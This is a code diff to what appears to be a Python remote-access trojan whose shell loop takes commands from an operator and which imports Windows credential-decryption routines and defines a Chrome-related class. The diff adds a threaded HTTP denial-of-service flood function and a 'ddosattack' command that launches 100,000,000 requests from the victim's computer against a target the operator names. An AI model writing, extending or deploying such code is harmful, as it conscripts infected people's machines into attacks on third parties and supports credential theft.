@@ -38,7 +38,59 @@ from win32crypt import CryptUnprotectData
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 
 httpd = HTTPServer(('', 8080), SimpleHTTPRequestHandler)
+thread_num = 0
 
+def attack(h, port, num_requests):
+    try:
+        host = str(h).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
+        ip = socket.gethostbyname(host)
+    except socket.gaierror:
+        pass
+
+    thread_num = 0
+    thread_num_mutex = threading.Lock()
+
+    def print_status():
+        global thread_num
+        thread_num_mutex.acquire(True)
+
+        thread_num += 1
+        sys.stdout.flush()
+        thread_num_mutex.release()
+
+    def generate_url_path():
+        msg = str(string.ascii_letters + string.digits + string.punctuation)
+        data = "".join(random.sample(msg, 5))
+        return data
+
+    def attack():
+        print_status()
+        url_path = generate_url_path()
+
+        dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+        try:
+            dos.connect((ip, int(port)))
+
+            byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
+            dos.send(byt)
+        except socket.error:
+            pass
+        finally:
+            dos.shutdown(socket.SHUT_RDWR)
+            dos.close()
+
+    # Spawn a thread per request
+    all_threads = []
+    for i in range(num_requests):
+        t1 = threading.Thread(target=attack)
+        t1.start()
+        all_threads.append(t1)
+
+        time.sleep(0.01)
+
+    for current_thread in all_threads:
+        current_thread.join()
 
 
 class chrome(object):
@@ -1168,6 +1220,24 @@ def shell():
                 elif command[:11] == "Http-Sestop":
                     threading.Thread(target=httpd.shutdown).start()
                     reliable_send("[+] Http Server Stopped")
+                elif command[:10] == "ddosattack":
+
+                    try:
+                        data = str(command).split("|")
+                    except IndexError:
+                        reliable_send("try the command in this syntax ddosattack ip,website|port")
+                        #error parsing data
+                        continue
+
+                    else:
+                        t = threading.Thread(target=attack, args=(data[1], data[2], 100000000))
+
+                        t.start()
+                        reliable_send("[+] attack started on "+data[1]+" from " + getpass.getuser() + " computer")
+
+
+
+
 
 
 
